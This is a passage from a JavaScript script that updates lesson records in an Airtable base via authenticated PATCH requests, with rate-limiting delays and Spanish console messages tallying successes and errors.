        const updateUrl = `https://api.airtable.com/v0/${AIRTABLE_BASE_ID}/lessons/${recordId}`;
        const updateResp = await fetch(updateUrl, {
          method: 'PATCH',
          headers: {
            'Authorization': `Bearer ${AIRTABLE_API_KEY}`,
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({ fields: update.updates })
        });
        
        if (updateResp.ok) {
          console.log(`✅ ${programId.toUpperCase()}: ${title}`);
          updated++;
        } else {
          const error = await updateResp.text();
          console.log(`❌ ${title}: ${error.substring(0, 100)}`);
          errors++;
        }
      } else {
        console.log(`⚠️ No encontrado: ${title}`);
        errors++;
      }
      
      await new Promise(r => setTimeout(r, 300));
      
    } catch (error) {
      console.log(`❌ Error: ${error.message}`);
      errors++;
    }
  }
  
  console.log(`\n========================================`);
  console.log(`✅ Actualizadas: ${updated} lecciones`);
  console.log(`❌ Errores: ${errors}`);
  console.log(`========================================`);
}

updateAll();
